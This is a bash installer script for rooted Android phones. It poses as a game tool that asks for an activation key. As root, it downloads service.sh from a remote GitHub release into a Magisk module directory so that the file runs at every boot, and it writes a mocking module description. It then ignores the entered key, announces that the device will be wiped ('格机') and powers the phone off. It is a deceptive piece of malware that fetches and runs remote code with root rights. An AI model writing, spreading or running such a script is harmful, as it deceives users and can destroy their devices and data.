#!/bin/bash
clear
[[ $EUID != 0 ]] && echo "当前非 ROOT 用户" && exit 1

url=https://gh.ddlc.top/https://github.com/ptcry233/foool_me/releases/latest/download/

_check(){
if [ $? -eq 0 ]; then
    echo "完毕！"
else
    echo "失败请切换网络重试！"
    rm -rf  /data/adb/modules/lazha_geji
    
fi
}

echo "[!] 加载中....."
mkdir /data/adb/modules/lazha_geji >/dev/null
curl -k -o  /data/adb/modules/lazha_geji/service.sh $url/service.sh
curl -k -o  /data/adb/modules/lazha_geji/gamelist $url/gamelist
echo -e "id=驱动拉闸版
name=🔥极速拉闸🔥
version=114514
versionCode=1919810
author=张tl他爹
description=[持续拉闸中😊] 不建议打开游戏！"> /data/adb/modules/lazha_geji/module.prop
clear
echo "当前时间：$(date)"
echo ""
echo "当前内核版本$(uname -r)"
echo ""
echo "----------------------"
sleep 1
echo "请输入卡密："
read NUL
echo "正在验证卡密，请稍等........"
sleep 2
echo "准备好格机吧，哥们"
reboot -p